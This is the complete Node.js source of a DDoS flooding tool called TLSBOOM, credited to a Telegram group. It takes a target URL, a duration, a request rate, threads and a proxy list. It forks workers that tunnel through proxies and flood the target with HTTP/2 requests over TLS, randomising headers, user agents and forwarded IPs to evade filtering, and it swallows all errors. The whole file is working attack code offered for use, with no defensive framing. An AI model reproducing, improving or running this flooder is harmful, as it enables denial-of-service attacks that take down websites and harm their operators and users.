///Code by https://t.me/ZeroDawnTeam
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
    console.log(`使用方法 node TLSBOOM.js 网页地址 时间 速率 线程数 代理文件`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

let now = new Date();
let year = now.getFullYear();
let month = now.getMonth() + 1;
let hours = now.getHours();

///Code by https://t.me/ZeroDawnTeam
var countries = ["Indonesia", "Malaysia", "Singapore", "Thailand", "Vietnam", "Philipina", "United States", "United kingdom", "Canada", "Russia", "Japan", "Myanmar", "German", "Netherlands"];

///Code by https://t.me/ZeroDawnTeam
var randomCountry = countries[Math.floor(Math.random() * countries.length)];

///Code by https://t.me/ZeroDawnTeam

const secureContext = tls.createSecureContext(secureContextOptions);

// 从命令行参数获取代理文件名
var proxyFile = process.argv[6];
var proxies = readLines(proxyFile);

// 定义生成 User-Agent 的函数
const uap = () => {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
        if (i % randomOrder === 0) {
            finalString += encryptedString.charAt(i);
        } else {
            finalString += encryptedString.charAt(i).toUpperCase();
        }
    }
    return finalString;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);

// 定义随机请求头函数
function randomHeaders() {
    const headers = {};
    const methods = ["GET", "POST", "PUT"];
    headers[":method"] = randomElement(methods);
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = "https";

    // 随机 Accept 头
    const acceptHeaders = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
        'text/html; charset=utf-8',
        'application/json, text/plain, */*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'application/json',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
        'text/html; charset=utf-8',
        'application/json, text/plain, */*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        "text/plain",
        "text/html",
        "application/json",
        "application/xml",
        "multipart/form-data",
        "application/octet-stream",
        "image/jpeg",
        "image/png",
        "audio/mpeg",
        "video/mp4",
        "application/javascript",
        "application/pdf",
        "application/vnd.ms-excel",
        "application/vnd.ms-powerpoint",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/zip",
        "image/gif",
        "image/bmp",
        "image/tiff",
        "audio/wav",
        "audio/midi",
        "video/avi",
        "video/mpeg",
        "video/quicktime",
        "text/csv",
        "text/xml",
        "text/css",
        "text/javascript",
        "application/graphql",
        "application/x-www-form-urlencoded",
        "application/vnd.api+json",
        "application/ld+json",
        "application/x-pkcs12",
        "application/x-pkcs7-certificates",
        "application/x-pkcs7-certreqresp",
        "application/x-pem-file",
        "application/x-x509-ca-cert",
        "application/x-x509-user-cert",
        "application/x-x509-server-cert",
        "application/x-bzip",
        "application/x-gzip",
        "application/x-7z-compressed",
        "application/x-rar-compressed",
        "application/x-shockwave-flash",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
        "application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9', "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 'application/json',
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",

    ];
    headers["accept"] = randomElement(acceptHeaders);

    // 随机 Accept-Language 头
    const languageHeaders = [
        "en-US,en;q=0.9",
        "es-ES,es;q=0.9",
        'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'de-DE,de;q=0.9',
        'el-GR,el;q=0.9',
        'es-ES,es;q=0.9',
        'et-EE,et;q=0.9',
        'eu-ES,eu;q=0.9',
        'fa-IR,fa;q=0.9',
        'fi-FI,fi;q=0.9',
        'fr-FR,fr;q=0.9',
        'ga-IE,ga;q=0.9',
        'gl-ES,gl;q=0.9',
        'gu-IN,gu;q=0.9',
        'he-IL,he;q=0.9',
        'hi-IN,hi;q=0.9',
        'hr-HR,hr;q=0.9',
        'hu-HU,hu;q=0.9',
        'hy-AM,hy;q=0.9',
        'id-ID,id;q=0.9',
        'is-IS,is;q=0.9',
        'it-IT,it;q=0.9',
        'ja-JP,ja;q=0.9',
        'ka-GE,ka;q=0.9',
        'kk-KZ,kk;q=0.9',
        'km-KH,km;q=0.9',
        'kn-IN,kn;q=0.9',
        'ko-KR,ko;q=0.9',
        'ky-KG,ky;q=0.9',
        'lo-LA,lo;q=0.9',
        'lt-LT,lt;q=0.9',
        'lv-LV,lv;q=0.9',
        'mk-MK,mk;q=0.9',
        'ml-IN,ml;q=0.9',
        'mn-MN,mn;q=0.9',
        'mr-IN,mr;q=0.9',
        'ms-MY,ms;q=0.9',
        'mt-MT,mt;q=0.9',
        'my-MM,my;q=0.9',
        'nb-NO,nb;q=0.9',
        'ne-NP,ne;q=0.9',
        'nl-NL,nl;q=0.9',
        'nn-NO,nn;q=0.9',
        'or-IN,or;q=0.9',
        'pa-IN,pa;q=0.9',
    ];
    headers["accept-language"] = randomElement(languageHeaders);

    // 随机 Accept-Encoding 头
    const encodingHeaders = [
        "gzip, deflate, br",
        "gzip, deflate",
        'gzip',
        'gzip, deflate, br',
        'compress, gzip',
        'deflate, gzip',
        'gzip, identity',
        'gzip, deflate',
        'br',
        'br;q=1.0, gzip;q=0.8, *;q=0.1',
        'gzip;q=1.0, identity; q=0.5, *;q=0',
        'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
        'compress;q=0.5, gzip;q=1.0',
        'identity',
        'gzip, compress',
        'compress, deflate',
        'compress',
        'gzip, deflate, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate',
    ];
    headers["accept-encoding"] = randomElement(encodingHeaders);

    // 随机 Cache-Control 头
    const cacheHeaders = [
        "no-cache",
        "max-age=0",
        "no-cache, no-store,private, max-age=0, must-revalidate",
        'max-age=0, must-revalidate, private',
        'max-age=0, private, must-revalidate',
        'max-age=604800, stale-while-revalidate=86400',
        'max-stale=3600',
        'public, max-age=2678400',
        'min-fresh=600',
        'public, max-age=30672000',
        'max-age=31536000, immutable',
        'max-age=604800, stale-if-error=86400',
        'public, max-age=604800',
        'no-cache, no-store,private, max-age=0, must-revalidate',
    ];
    headers["cache-control"] = randomElement(cacheHeaders);

    // 随机 Sec-CH-UA-Mobile 头
    headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);

    // 随机 Sec-CH-UA-Platform 头
    const platformHeaders = [
        "Android", "iOS", "Linux", "macOS", "Windows"
    ];
    headers["sec-ch-ua-platform"] = randomElement(platformHeaders);

    // 随机 Sec-Fetch-Dest 头
    const destHeaders = [
        "document",
        "empty",
        // ... 其他目标选项
    ];
    headers["sec-fetch-dest"] = randomElement(destHeaders);

    // 随机 Sec-Fetch-Mode 头
    const modeHeaders = [
        "navigate",
        "cors",
        // ... 其他模式选项
    ];
    headers["sec-fetch-mode"] = randomElement(modeHeaders);

    // 随机 Sec-Fetch-Site 头
    const siteHeaders = [
        "same-origin",
        "cross-site"
        // ... 其他站点选项
    ];
    headers["sec-fetch-site"] = randomElement(siteHeaders);

    // 随机 Upgrade-Insecure-Requests 头
    headers["upgrade-insecure-requests"] = randomElement(["1", "0"]);

    return headers;
}


if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    console.log(``)
    console.log(`Target: ${process.argv[2]}`);
    console.log(`Port: ${process.argv[4]}`);
    console.log(`Time: ${process.argv[3]}`);
    console.log(`Methods: TLSBOOM`);
    console.log("Org: " + randomCountry);
    console.log(`Start Attack: ${year}-${month}-${hours}`);
    console.log(`Code by https://t.me/ZeroDawnTeam`);

} else {
    for (let i = 0; i < 120; i++) {
        setInterval(runFlooder, 0)
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}


function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    // 调用 randomHeaders() 函数获取随机请求头
    const headers = randomHeaders();

    /** Code by https://t.me/ZeroDawnTeam */
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = uap(); // 调用 uap() 函数生成 User-Agent
    headers["x-forwarded-for"] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true)

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 655000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
            //socket: connection,
            ///Code by https://t.me/ZeroDawnTeam
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)

                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);

process.on('uncaughtException', error => { });
process.on('unhandledRejection', error => { });

///Code by https://t.me/ZeroDawnTeam